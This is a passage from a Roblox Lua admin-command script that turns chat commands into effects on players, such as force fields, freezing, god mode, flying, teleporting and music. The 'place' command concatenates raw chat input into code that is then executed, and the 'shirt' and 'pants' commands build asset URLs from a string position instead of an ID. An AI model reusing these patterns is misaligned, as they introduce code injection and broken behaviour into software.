if v and v.Character and v.Character:findFirstChild("Torso") then
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Sparkles") then cl:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,3) == "ff " then
local plrz = GetPlr(plr, msg:lower():sub(4))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then Instance.new("ForceField", v.Character) end
end))
end
end
 
if msg:lower():sub(1,5) == "unff " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for z, cl in pairs(v.Character:children()) do if cl:IsA("ForceField") then cl:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,7) == "punish " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
v.Character.Parent = game:service("Lighting")
end
end))
end
end
 
if msg:lower():sub(1,9) == "unpunish " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
v.Character.Parent = game:service("Workspace")
v.Character:MakeJoints()
end
end))
end
end
 
if msg:lower():sub(1,7) == "freeze " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Anchored = true end v.Character.Humanoid.WalkSpeed = 0
end
end
end))
end
end
 
if msg:lower():sub(1,5) == "thaw " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") then obj.Anchored = false end v.Character.Humanoid.WalkSpeed = 16
end
end
end))
end
end
 
if msg:lower():sub(1,5) == "heal " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end))
end
end
 
if msg:lower():sub(1,4) == "god " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.MaxHealth = math.huge
v.Character.Humanoid.Health = 9e9
end
end))
end
end
 
if msg:lower():sub(1,6) == "ungod " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.MaxHealth = 100
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end))
end
end
 
if msg:lower():sub(1,8) == "ambient " then
local chk1 = msg:lower():sub(9):find(" ") + 8
local chk2 = msg:sub(chk1+1):find(" ") + chk1
game.Lighting.Ambient = Color3.new(msg:sub(9,chk1-1),msg:sub(chk1+1,chk2-1),msg:sub(chk2+1))
end
 
if msg:lower():sub(1,11) == "brightness " then
game.Lighting.Brightness = msg:sub(12)
end
 
if msg:lower():sub(1,5) == "time " then
game.Lighting.TimeOfDay = msg:sub(6)
end
 
if msg:lower():sub(1,9) == "fogcolor " then
local chk1 = msg:lower():sub(10):find(" ") + 9
local chk2 = msg:sub(chk1+1):find(" ") + chk1
game.Lighting.FogColor = Color3.new(msg:sub(10,chk1-1),msg:sub(chk1+1,chk2-1),msg:sub(chk2+1))
end
 
if msg:lower():sub(1,7) == "fogend " then
game.Lighting.FogEnd = msg:sub(8)
end
 
if msg:lower():sub(1,9) == "fogstart " then
game.Lighting.FogStart = msg:sub(10)
end
 
if msg:lower():sub(1,7) == "btools " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local t1 = Instance.new("HopperBin", v.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", v.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", v.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local t4= Instance.new("HopperBin", v.Backpack) t4.Name = "Resize"
local cl4 = script.LocalScriptBase:Clone() cl4.Parent = t4 cl4.Code.Value = [[
repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer:findFirstChild("PlayerGui")
local sb
local hs
local pdist
 
script.Parent.Selected:connect(function(mouse)
if not mouse then return end
sb = Instance.new("SelectionBox", game.Players.LocalPlayer.PlayerGui) sb.Color = BrickColor.new("Bright blue") sb.Adornee = nil
hs = Instance.new("Handles", game.Players.LocalPlayer.PlayerGui) hs.Color = BrickColor.new("Bright blue") hs.Adornee = nil
mouse.Button1Down:connect(function() if not mouse.Target or mouse.Target.Locked then sb.Adornee = nil hs.Adornee = nil else sb.Adornee = mouse.Target hs.Adornee = mouse.Target hs.Faces = mouse.Target.ResizeableFaces end end)
hs.MouseDrag:connect(function(old,dist) if hs.Adornee and math.abs(dist-pdist) >= hs.Adornee.ResizeIncrement then if hs.Adornee:Resize(old, math.floor((dist-pdist)/ hs.Adornee.ResizeIncrement + .5) * hs.Adornee.ResizeIncrement) then pdist = dist end end end)
hs.MouseButton1Down:connect(function() pdist = 0 end)
end)
 
script.Parent.Deselected:connect(function() sb:Destroy() hs:Destroy() end)]] cl4.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,5) == "give " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") and game:findFirstChild("Lighting") then
for a, tool in pairs(game.Lighting:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if msg:lower():sub(chk1+1) == "all" or tool.Name:lower():find(msg:lower():sub(chk1+1)) == 1 then tool:Clone().Parent = v.Backpack end
end
end
end
end))
end
end
 
if msg:lower():sub(1,12) == "removetools " then
local plrz = GetPlr(plr, msg:lower():sub(13))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v:findFirstChild("Backpack") then
for a, tool in pairs(v.Character:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
for a, tool in pairs(v.Backpack:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,5) == "rank " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:IsInGroup(msg:sub(chk1+1)) then
Hint("[" .. v:GetRankInGroup(msg:sub(chk1+1)) .. "] " .. v:GetRoleInGroup(msg:sub(chk1+1)), {plr})
elseif v and not v:IsInGroup(msg:sub(chk1+1))then
Hint(v.Name .. " is not in the group " .. msg:sub(chk1+1), {plr})
end
end))
end
end
 
if msg:lower():sub(1,7) == "damage " then
local chk1 = msg:lower():sub(8):find(" ") + 7
local plrz = GetPlr(plr, msg:lower():sub(8,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid:TakeDamage(msg:sub(chk1+1))
end
end))
end
end
 
if msg:lower():sub(1,5) == "grav " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,8) == "setgrav " then
local chk1 = msg:lower():sub(9):find(" ") + 8
local plrz = GetPlr(plr, msg:lower():sub(9,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force - Vector3.new(0,prt:GetMass()*msg:sub(chk1+1),0) elseif prt:IsA("Hat") then frc.force = frc.force - Vector3.new(0,prt.Handle:GetMass()*msg:sub(chk1+1),0) end end
end
end))
end
end
 
if msg:lower():sub(1,7) == "nograv " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force + Vector3.new(0,prt:GetMass()*196.25,0) elseif prt:IsA("Hat") then frc.force = frc.force + Vector3.new(0,prt.Handle:GetMass()*196.25,0) end end
end
end))
end
end
 
if msg:lower():sub(1,7) == "health " then
local chk1 = msg:lower():sub(8):find(" ") + 7
local plrz = GetPlr(plr, msg:lower():sub(8,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.MaxHealth = msg:sub(chk1+1)
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end))
end
end
 
if msg:lower():sub(1,6) == "speed " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then
v.Character.Humanoid.WalkSpeed = msg:sub(chk1+1)
end
end))
end
end
 
if msg:lower():sub(1,5) == "team " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and game:findFirstChild("Teams") then
for a, tm in pairs(game.Teams:children()) do
if tm.Name:lower():find(msg:lower():sub(chk1+1)) == 1 then v.TeamColor = tm.TeamColor end
end
end
end))
end
end
 
if msg:lower():sub(1,6) == "place " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[game:service("TeleportService"):Teleport(]] .. msg:sub(chk1+1) .. ")" cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,3) == "tp " then
local chk1 = msg:lower():sub(4):find(" ") + 3
local plrz = GetPlr(plr, msg:lower():sub(4,chk1-1))
local plrz2 = GetPlr(plr, msg:lower():sub(chk1+1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
for i2, v2 in pairs(plrz2) do
if v and v2 and v.Character and v2.Character and v.Character:findFirstChild("Torso") and v2.Character:findFirstChild("Torso") then
v.Character.Torso.CFrame = v2.Character.Torso.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1))
end
end
end))
end
end
 
if msg:lower():sub(1,7) == "change " then
local chk1 = msg:lower():sub(8):find(" ") + 7
local chk2 = msg:sub(chk1+1):find(" ") + chk1
local plrz = GetPlr(plr, msg:lower():sub(8,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("leaderstats") then
for a, st in pairs(v.leaderstats:children()) do
if st.Name:lower():find(msg:sub(chk1+1,chk2-1)) == 1 then st.Value = msg:sub(chk2+1) end
end
end
end))
end
end
 
if msg:lower():sub(1,6) == "shirt " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v:IsA("Shirt") then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.roblox.com/asset/?id=" .. chk1 v:Destroy() end
end
end
end))
end
end
 
if msg:lower():sub(1,6) == "pants " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v:IsA("Pants") then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.roblox.com/asset/?id=" .. chk1 v:Destroy() end
end
end
end))
end
end
 
if msg:lower():sub(1,5) == "face " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Head") and v.Character.Head:findFirstChild("face") then
v.Character.Head:findFirstChild("face").Texture = "http://www.roblox.com/asset/?id=" .. chk1
end
end))
end
end
 
------------------
-- Fun Commands --
------------------
if FunCommands or plr.userId == game.CreatorId or ChkOwner(plr.Name:lower()) then
       
if msg:lower():sub(1,8) == "swagify " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v.Name == "Shirt" then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
if v.Name == "Pants" then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
end
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
local cl = script.LocalScriptBase:Clone() cl.Name = "CapeScript" cl.Code.Value = [[local plr = game.Players.LocalPlayer
repeat wait() until plr and plr.Character and plr.Character:findFirstChild("Torso")
local torso = plr.Character.Torso
local p = Instance.new("Part", torso.Parent) p.Name = "EpicCape" p.Anchored = false
p.CanCollide = false p.TopSurface = 0 p.BottomSurface = 0 p.BrickColor = BrickColor.new("Pink") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=109301474" p.formFactor = "Custom"
p.Size = Vector3.new(.2,.2,.2)
local msh = Instance.new("BlockMesh", p) msh.Scale = Vector3.new(9,17.5,.5)
local motor1 = Instance.new("Motor", p)
motor1.Part0 = p
motor1.Part1 = torso
motor1.MaxVelocity = .01
motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
local wave = false
repeat wait(1/44)
local ang = 0.1
local oldmag = torso.Velocity.magnitude
local mv = .002
if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
ang = ang + math.min(torso.Velocity.magnitude/11, .5)
motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
motor1.DesiredAngle = -ang
if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
repeat wait() until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
if torso.Velocity.magnitude < .1 then wait(.1) end
until not p or p.Parent ~= torso.Parent
script:Destroy()
]] cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,6) == "music " then
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
local id = msg:sub(7)
local pitch = 1
if tostring(id):lower():find("caramell") then id = 2303479 end
if tostring(id):find("epic") then id = 27697743 pitch = 2.5 end
if tostring(id):find("rick") then id = 2027611 end
if tostring(id):find("halo") then id = 1034065  end
if tostring(id):find("pokemon") then id = 1372261 end
if tostring(id):find("cursed") then id = 1372257 end
if tostring(id):find("extreme") then id = 11420933 end
if tostring(id):find("awaken") then id = 27697277 end
if tostring(id):find("alone") then id = 27697392 end
if tostring(id):find("mario") then id = 1280470 end
if tostring(id):find("choir") then id = 1372258 end
if tostring(id):find("chrono") then id = 1280463 end
if tostring(id):find("dotr") then id = 11420922 end
if tostring(id):find("entertain") then id = 27697267 end
if tostring(id):find("fantasy") then id = 1280473 end
if tostring(id):find("final") then id = 1280414 end
if tostring(id):find("emblem") then id = 1372259 end
if tostring(id):find("flight") then id = 27697719 end
if tostring(id):find("banjo") then id = 27697298 end
if tostring(id):find("gothic") then id = 27697743 end
if tostring(id):find("hiphop") then id = 27697735 end
if tostring(id):find("intro") then id = 27697707 end
if tostring(id):find("mule") then id = 1077604 end
if tostring(id):find("film") then id = 27697713 end
if tostring(id):find("nezz") then id = 8610025 end
if tostring(id):find("angel") then id = 1372260 end
if tostring(id):find("resist") then id = 27697234 end
if tostring(id):find("schala") then id = 5985787 end
if tostring(id):find("organ") then id = 11231513 end
if tostring(id):find("tunnel") then id = 9650822 end
if tostring(id):find("spanish") then id = 5982975 end
if tostring(id):find("venom") then id = 1372262 end
if tostring(id):find("wind") then id = 1015394 end
if tostring(id):find("guitar") then id = 5986151 end
local s = Instance.new("Sound", game.Workspace) s.SoundId = "http://www.roblox.com/asset/?id=" .. id s.Volume = 1 s.Pitch = pitch s.Looped = true s.archivable = false repeat s:Play() wait(2.5) s:Stop() wait(.5) s:Play() until s.IsPlaying
end
 
if msg:lower() == "stopmusic" then
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
end
 
if msg:lower() == "musiclist" then
if plr.PlayerGui:findFirstChild("MUSICGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "MUSICGUI" scr.Parent = plr.PlayerGui
local list = {"caramell","epic","rick","halo","pokemon","cursed","extreme","awaken","alone","mario","choir","chrono","dotr","entertain","fantasy","final","emblem","flight","banjo","gothic","hiphop","intro","mule","film","nezz","angel","resist","schala","organ","tunnel","spanish","venom","wind","guitar"}
for i, v in pairs(list) do local cl = ent:Clone() cl.Parent = cmf cl.Text = v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
end
 
if msg:lower():sub(1,4) == "fly " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
local cl = script.LocalScriptBase:Clone() cl.Name = "FlyScript" cl.Code.Value = [[repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") local mouse = game.Players.LocalPlayer:GetMouse() repeat wait() until mouse ~= nil local plr = game.Players.LocalPlayer local torso = plr.Character.Torso local flying = false local deb = true local ctrl = {f = 0, b = 0, l = 0, r = 0} local lastctrl = {f = 0, b = 0, l = 0, r = 0} local maxspeed = 50 local speed = 0 function Fly() local bg = Instance.new("BodyGyro", torso) bg.P = 9e4 bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) bg.cframe = torso.CFrame local bv = Instance.new("BodyVelocity", torso) bv.velocity = Vector3.new(0,0.1,0) bv.maxForce = Vector3.new(9e9, 9e9, 9e9) repeat wait() plr.Character.Humanoid.PlatformStand = true if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then speed = speed+.5+(speed/maxspeed) if speed > maxspeed then speed = maxspeed end elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then speed = speed-1 if speed < 0 then speed = 0 end end if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed else bv.velocity = Vector3.new(0,0.1,0) end bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) until not flying ctrl = {f = 0, b = 0, l = 0, r = 0} lastctrl = {f = 0, b = 0, l = 0, r = 0} speed = 0 bg:Destroy() bv:Destroy() plr.Character.Humanoid.PlatformStand = false end mouse.KeyDown:connect(function(key) if key:lower() == "e" then if flying then flying = false else flying = true Fly() end elseif key:lower() == "w" then ctrl.f = 1 elseif key:lower() == "s" then ctrl.b = -1 elseif key:lower() == "a" then ctrl.l = -1 elseif key:lower() == "d" then ctrl.r = 1 end end) mouse.KeyUp:connect(function(key) if key:lower() == "w" then ctrl.f = 0 elseif key:lower() == "s" then ctrl.b = 0 elseif key:lower() == "a" then ctrl.l = 0 elseif key:lower() == "d" then ctrl.r = 0 end end)]]
cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,6) == "unfly " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then
for a, q in pairs(v.PlayerGui:children()) do if q.Name == "FlyScript" then q:Destroy() end end
for a, q in pairs(v.Character.Torso:children()) do if q.Name == "BodyGyro" or q.Name == "BodyVelocity" then q:Destroy() end end
wait(.1) v.Character.Humanoid.PlatformStand = false
end
end))
end
end
 
if msg:lower() == "disco" then
for i, v in pairs(lobjs) do v:Destroy() end
local cl = script.ScriptBase:Clone() cl.Name = "LightEdit" cl.Code.Value = [[repeat wait(.1) local color = Color3.new(math.random(255)/255,math.random(255)/255,math.random(255)/255)
game.Lighting.Ambient = color
game.Lighting.FogColor = color
until nil]]
table.insert(lobjs, cl) cl.Parent = game.Workspace cl.Disabled = false
end
 
if msg:lower() == "flash" then
for i, v in pairs(lobjs) do v:Destroy() end
local cl = script.ScriptBase:Clone() cl.Name = "LightEdit" cl.Code.Value = [[repeat wait(.1)
game.Lighting.Ambient = Color3.new(1,1,1)
game.Lighting.FogColor = Color3.new(1,1,1)
game.Lighting.Brightness = 1
game.Lighting.TimeOfDay = 14
wait(.1)
game.Lighting.Ambient = Color3.new(0,0,0)
game.Lighting.FogColor = Color3.new(0,0,0)
game.Lighting.Brightness = 0
game.Lighting.TimeOfDay = 0
until nil]]
table.insert(lobjs, cl) cl.Parent = game.Workspace cl.Disabled = false
end
 
if msg:lower():sub(1,5) == "spin " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for i,v in pairs(v.Character.Torso:children()) do if v.Name == "SPINNER" then v:Destroy() end end
local torso = v.Character:findFirstChild("Torso")
local bg = Instance.new("BodyGyro", torso) bg.Name = "SPINNER" bg.maxTorque = Vector3.new(0,math.huge,0) bg.P = 11111 bg.cframe = torso.CFrame table.insert(objects,bg)
repeat wait(1/44) bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(30),0)
until not bg or bg.Parent ~= torso
end
end))
end
end
 
if msg:lower():sub(1,7) == "unspin " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a,q in pairs(v.Character.Torso:children()) do if q.Name == "SPINNER" then q:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,4) == "dog " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 1
v.Character.Torso.Neck.C0 = CFrame.new(0,-.5,-2) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1.5,-1,1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1.5,-1,1.5) * CFrame.Angles(0,math.rad(-90),0)
local new = Instance.new("Seat", v.Character) new.Name = "FAKETORSO" new.formFactor = "Symmetric" new.TopSurface = 0 new.BottomSurface = 0 new.Size = Vector3.new(3,1,4) new.CFrame = v.Character.Torso.CFrame
local bf = Instance.new("BodyForce", new) bf.force = Vector3.new(0,new:GetMass()*196.25,0)
local weld = Instance.new("Weld", v.Character.Torso) weld.Part0 = v.Character.Torso weld.Part1 = new weld.C0 = CFrame.new(0,-.5,0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Brown") elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Brown") end end
end
end))
end
end
 
if msg:lower():sub(1,6) == "undog " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end))
end
end
 
if msg:lower():sub(1,8) == "creeper " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Bright green") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Bright green") end end
end
end))
end
end
 
if msg:lower():sub(1,10) == "uncreeper " then
local plrz = GetPlr(plr, msg:lower():sub(11))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
